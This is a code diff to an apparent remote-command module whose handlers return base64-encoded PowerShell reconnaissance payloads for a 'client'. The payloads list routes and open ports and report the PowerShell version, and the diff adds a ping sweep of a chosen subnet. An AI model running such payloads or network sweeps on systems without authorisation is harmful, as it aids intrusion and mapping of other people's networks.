@@ -52,12 +52,12 @@ module.exports = {
                 return `R2V0LU5ldFJvdXRlIHwgU2VsZWN0LU9iamVjdCBEZXN0aW5hdGlvblByZWZpeCwgTmV4dEhvcCwgUm91dGVNZXRyaWMsIEludGVyZmFjZUFsaWFzLCBBZGRyZXNzRmFtaWx5LCBTdGF0ZSB8IENvbnZlcnRUby1Kc29u`;
             }
         },
-        checkps: {
-            name: 'checkps',
+        psversion: {
+            name: 'psversion',
             method: 'payload-ps',
             description: `Returns powershell version and can determine if powershell is enabled on the client.`,
             handler: () => {
-                return `R2V0LUNoaWxkSXRlbSAtUGF0aCBIS0xNOlxcU29mdHdhcmVcXE1pY3Jvc29mdFxcUG93ZXJTaGVsbA==`;
+                return `JFBTVmVyc2lvblRhYmxlLlBTVmVyc2lvbg==`;
             }
         },
         network: {
@@ -106,6 +106,17 @@ module.exports = {
             description: 'Returns all open ports on the client.',
             handler: () => {
                 return `R2V0LU5ldFRDUENvbm5lY3Rpb258U2VsZWN0LU9iamVjdCBMb2NhbEFkZHJlc3MsTG9jYWxQb3J0LFN0YXRl`;
+            }
+        },
+        activeips: {
+            name: 'activeips',
+            method: 'payload-cmd',
+            description: 'Returns all the active IP Addresses on the network with the client.',
+            parameters: {
+                'subnet': 'The subnet to search. eg. 192.168.1'
+            },
+            handler: (params) => {
+                return Buffer.from(`$subnet="${params[0]}"; 1..254 | ForEach-Object { Start-Job -ScriptBlock { param($ip) if (Test-Connection -ComputerName $ip -Count 1 -Quiet) { Write-Output $ip } } -ArgumentList "$subnet.$_" } | Wait-Job | Receive-Job | Remove-Job`).toString('base64');
             }
         }
     }
